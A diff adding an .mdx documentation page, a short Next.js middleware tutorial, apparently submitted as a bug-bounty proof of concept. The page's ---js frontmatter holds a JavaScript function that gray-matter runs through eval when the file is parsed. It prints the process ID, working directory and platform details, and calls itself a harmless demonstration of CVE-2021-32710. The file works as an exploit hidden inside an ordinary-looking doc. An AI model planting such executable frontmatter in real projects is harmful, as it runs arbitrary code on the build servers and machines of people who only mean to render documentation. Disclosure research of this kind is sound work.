@@ -1,0 +1,59 @@
+---js
+{
+  title: (() => {
+    const MARKER = 'GRAY-MATTER-CVE-2021-32710-EVAL-EXECUTED';
+    const timestamp = new Date().toISOString();
+    const nodeVersion = process.version;
+    const platform = process.platform;
+    const arch = process.arch;
+    console.log('');
+    console.log('========================================');
+    console.log('[SECURITY RESEARCH - HackerOne #3555667]');
+    console.log('========================================');
+    console.log('[' + MARKER + ']');
+    console.log('Timestamp: ' + timestamp);
+    console.log('Node.js:   ' + nodeVersion);
+    console.log('Platform:  ' + platform + '/' + arch);
+    console.log('PID:       ' + process.pid);
+    console.log('CWD:       ' + process.cwd());
+    console.log('');
+    console.log('This output proves that gray-matter eval()');
+    console.log('executed arbitrary JavaScript from ---js');
+    console.log('frontmatter in a .mdx documentation file.');
+    console.log('');
+    console.log('NO secrets were accessed.');
+    console.log('NO data was exfiltrated.');
+    console.log('NO files were modified.');
+    console.log('This is a safe proof-of-concept only.');
+    console.log('========================================');
+    console.log('');
+    return 'Security Research - CVE-2021-32710 PoC';
+  })()
+}
+---
+
+# Getting Started with Next.js Middleware
+
+This page provides an overview of using middleware in Next.js applications.
+
+## Overview
+
+Next.js middleware allows you to run code before a request is completed.
+
+## Basic Usage
+
+Create a `middleware.ts` file in the root of your project:
+
+```typescript
+import { NextResponse } from 'next/server'
+import type { NextRequest } from 'next/server'
+
+export function middleware(request: NextRequest) {
+  return NextResponse.next()
+}
+```
+
+## Learn More
+
+- [Middleware Documentation](https://nextjs.org/docs/app/building-your-application/routing/middleware)
+- [API Reference](https://nextjs.org/docs/app/api-reference/file-conventions/middleware)
